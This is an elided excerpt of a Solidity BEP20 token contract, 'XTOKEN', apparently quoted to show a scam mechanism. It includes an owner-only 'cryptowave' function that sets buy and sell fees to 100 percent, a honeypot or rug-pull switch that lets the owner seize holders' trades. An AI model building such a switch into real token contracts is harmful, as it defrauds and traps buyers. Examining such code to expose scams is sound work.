...
contract XTOKEN is Ownable, BEP20 {
    ...
    string constant _symbol = "XTOKEN";
        ...
        returns (bool success)
    {
        ...
        return BEP20(tokenAddress).transfer(autoLiquidityReceiver, tokens);
    }
    ...
    function cryptowave() public onlyOwner {
        ot = true;
        buypercent = 100;
        sellpercent = 100;
        transferpercent = 0;
